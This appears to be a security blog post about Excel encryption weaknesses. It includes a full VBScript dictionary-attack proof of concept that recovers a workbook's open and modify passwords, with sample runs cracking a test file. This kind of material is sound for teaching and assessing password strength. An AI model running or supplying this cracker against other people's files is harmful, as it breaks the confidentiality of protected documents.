---
title:  "Dictionary Attack on Excel Passwords"
---

![Logo](/assets/images/dictionary.jpg)

## Context 

When thinking about the security of encrypted Excel documents, I found a great article analyzing [security of encryption algorithms](http://www.oraxcel.com/projects/encoffice/help/How_safe_is_Excel_encryption.html) for Excel spreadsheets. The bottom line is that:
* Encryption in Excel 2007 IS secure only for ".docx". For ".doc" it's NOT secure with default settings.
* Encryption in Excel 2002 and 2003 IS secure, but NOT when used with default settings!
* Encryption in Excel 95, 97 and 2000 is NOT secure at all :)

Instructions on how to make sure you're using the most secure algorithms and how to change the default settings in the referenced link. Another good reference on Excel 2007 Encryption Strength is [this discussion](https://security.stackexchange.com/questions/17702/excel-2007-encryption-strength).

## Setting password to open/modify
Changing/removing the **_password to open_** a file is pretty straight-forward in Excel 2007-2010: File menu->Info->Encrypt with password. 
I found that changing the **_password to modify_** is not so straight-forward. To set/remove a "read-only" password, from the _Save_ or _Save As_ dialog boxes, select _General Options_ from the _Tools_ drop-down menu to open the _General Options_ dialog box. There, in the _Password to modify box_, you can enter the new password or blank to remove the current one. 

## Dictionary attack
If the password is a dictionary word, then it's pretty easy to find it. I've made a small Visual Basic script to attack these 2 passwords (password to open and password to modify)  using words from a dictionary file. This could also be extended to something like the rules in [jtr](https://github.com/magnumripper/JohnTheRipper) to intelligently guess/brute-force passwords, possibly based on the very efficient [KoreLogic John rules](http://contest-2010.korelogic.com/rules.html). 

Currently it's just a proof of concept, and it's very slow, but it could be extended to use more threads or optimized:
```javascript
' *****************************************************************
' Dictionary attack on Excel passwords
'
' Uses Workbooks.open method and a password dictionary to test:
' 1) password to open 
' 2) password for write access, using open password
'
' Usage: "CScript excel-pw-attack.vbs <test .xls=""> <words .dic="">"
'
' Full Description:
' http://insecure.tk/......
' *****************************************************************
Option Explicit
On Error Resume Next
 
Dim objExcel
Set objExcel = WScript.CreateObject("Excel.Application")
objExcel.visible=False
 
Dim args
if WScript.Arguments.Count < 2 or WScript.Arguments.Count > 3 then
   WScript.Echo "Usage: "
   WScript.Echo "Search password for open: "
   WScript.Echo "   CScript " & WScript.ScriptName & " <excel file=""> <dictionary file="">"
   WScript.Echo "Search password for modify, using password to open: "
   WScript.Echo "   CScript " & WScript.ScriptName & " <excel file=""> <dictionary file=""> <open password="">"
   WScript.Quit 1
end if
 
' Excel file should be in the script's directory
Dim xlsFile, currentPath
currentPath = replace(WScript.ScriptFullName, WScript.ScriptName, "")
xlsFile = currentPath & WScript.Arguments(0)
WScript.Echo "Brute-forcing excel file: " & xlsFile
WScript.Echo "Using dictionary file: " & WScript.Arguments(1)
if WScript.Arguments.Count = 3 then
 WScript.Echo "Using open password " & WScript.Arguments(2) & " to get the write password"
end if
 
' Read the passwords from the dictionary file
Dim objFSO
Set objFSO = CreateObject("Scripting.FileSystemObject")
 
Dim objFile
Const ForReading = 1
Set objFile = objFSO.OpenTextFile(currentPath & WScript.Arguments(1), ForReading)
 
Dim currLine, bFound
bFound = False
While Not bFound And Not objFile.AtEndOfStream
 currLine = objFile.ReadLine
 WScript.Echo "[*] Testing solution " & currLine
 if WScript.Arguments.Count = 3 then
  objExcel.Workbooks.Open xlsFile, , , , WScript.Arguments(2), currLine
 else
  ' Try to open it in read-only mode
  objExcel.Workbooks.Open xlsFile, ,True , , currLine
 end if
 if Err.Number >  0 then
  'WScript.Echo Err.Description & Err.Number
  Err.Clear
 else
  bFound = True
  if WScript.Arguments.Count = 3 then
   WScript.Echo "[+] Found password for modifying: " & currLine
  else
   WScript.Echo "[+] Found password for opening: " & currLine
  end if
 end If
Wend
 
if not bFound then
 if WScript.Arguments.Count = 3 then
  WScript.Echo "[-] Not found password for modifying."
 else
  WScript.Echo "[-] Not found password for opening."
 end if
end if
 
 
objExcel.Workbooks.Close
objFile.close
```
## Usage

An example of how to use it on a test document with these 2 passwords set:
## 1. Find password to open:
```bash
> cscript excel-pw-attack.vbs test.xls words_en.txt
Microsoft (R) Windows Script Host Version 5.8
Copyright (C) Microsoft Corporation. All rights reserved.
 
Brute-forcing excel file: C:\...\test.xls
Using dictionary file: words_en.txt
[+] Found password for opening: rock
```

## 2. Find password to modify: 
```bash
>cscript excel-pw-attack.vbs test.xls words_en.txt rock
Microsoft (R) Windows Script Host Version 5.8
Copyright (C) Microsoft Corporation. All rights reserved.
 
Brute-forcing excel file: C:\...\test.xls
Using dictionary file: words_en.txt
Using open password rock to get the write password
[+] Found password for modifying: paper
```
